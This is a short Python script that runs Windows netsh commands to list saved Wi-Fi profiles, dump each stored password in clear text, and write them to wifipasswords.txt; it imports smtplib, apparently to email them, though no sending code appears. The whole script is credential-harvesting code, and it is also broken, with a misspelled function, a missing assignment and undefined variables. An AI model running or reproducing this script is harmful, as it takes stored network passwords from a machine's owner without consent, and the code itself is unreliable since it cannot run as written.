#!/usr/bin/python

import subprocess, smtplib, re


command = "netsh wlan show profile"
networks = subprocess.chec_output(command, shell=True)
network_list = re.findall('(?:Profile\s*:\s)(.*)', networks)

output = ""
for network in network_list:
    command "netsh wlan show profile " + network + " key=clear"
    one_network_result = subprocess.check_output(command2, shell=True)
    final_output += one_network_result

file = open("wifipasswords.txt","w")
file.write(final_output)
file.close()
